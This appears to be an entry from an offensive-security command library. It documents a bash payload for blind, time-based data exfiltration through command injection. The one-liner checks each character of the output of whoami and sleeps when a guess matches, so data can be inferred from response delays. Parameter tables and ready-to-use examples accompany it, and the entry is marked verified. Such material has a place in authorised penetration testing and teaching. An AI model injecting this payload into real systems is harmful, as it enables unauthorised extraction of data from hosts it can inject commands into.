---
id: 9f9a5792-ffc7-4c54-8484-2448d09f6813
name: bash-time-based-char-check
type: command
executor: bash
data: 'if [ $(whoami | cut -c $_POSITION) == "$_GUESS" ]; then sleep $_DELAY; fi'
output: null
created_at: '2023-04-06T03:55:57.447099+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - command-injection
  - exfiltration
verified: true
validated: true
---

# bash-time-based-char-check

## Command

```bash
if [ $(whoami | cut -c $_POSITION) == "$_GUESS" ]; then sleep $_DELAY; fi
```

## Description

This bash command checks if a specific character position in the current username matches a guessed value, sleeping for a defined duration if true. Used in time-based exfiltration to infer data via response delays in blind command injection scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_POSITION | Character position to check (e.g., 1 for first char) | Yes |
| $_GUESS | Guessed character (e.g., 's', 'a') | Yes |
| $_DELAY | Sleep duration in seconds for match (e.g., 5) | Yes |

## Examples

### Basic Usage

Check if first character is 's' with 5-second delay:

```bash
if [ $(whoami | cut -c 1) == "s" ]; then sleep 5; fi
```

### Advanced Usage

Check second character against 'w' with 3-second delay:

```bash
if [ $(whoami | cut -c 2) == "w" ]; then sleep 3; fi
```

## Expected Output

No direct output; success is inferred from a response delay of approximately $_DELAY seconds (plus baseline latency). Non-match responses are near-instant.

## Related

- [[procedures/Time-Based-Data-Exfiltration-via-Command-Injection]]
